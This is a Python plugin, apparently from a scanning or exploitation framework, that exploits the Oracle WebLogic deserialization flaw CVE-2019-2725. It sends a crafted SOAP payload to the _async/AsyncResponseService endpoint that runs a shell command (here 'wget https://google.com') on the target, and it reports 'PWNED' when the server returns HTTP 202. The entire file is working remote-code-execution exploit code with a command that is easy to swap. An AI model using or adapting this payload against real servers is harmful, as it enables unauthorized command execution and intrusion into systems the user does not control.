plugins/cve-2019-2725.py

from utils.status import *
from .helper import Plugin,utils

class CVE_2019_2725(Plugin):
    def __init__(self):
        self.name        = "WebLogic RCE - CVE_2019_2725"
        self.enable      = True
        self.description = ""

    def presquites(self, host):
        if utils.isalive( utils.uri(host) ):
            return True
        return False

    def main(self,host):
        payload = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>wget https://google.com</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'
        request = utils.requests.post( utils.uri(host) + '_async/AsyncResponseService', data=payload, headers={
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Connection": "close",
            "Content-Type": "text/xml"
        })

        if request.status_code == 202:
            return Result(
                    status   = SUCCESS,
                    msg      = "PWNED",
                    request  = utils.dump_request(request),
                    response = utils.dump_response(request)
                )
            
        return Result(FAILED,None,utils.dump_request(request),utils.dump_response(request))
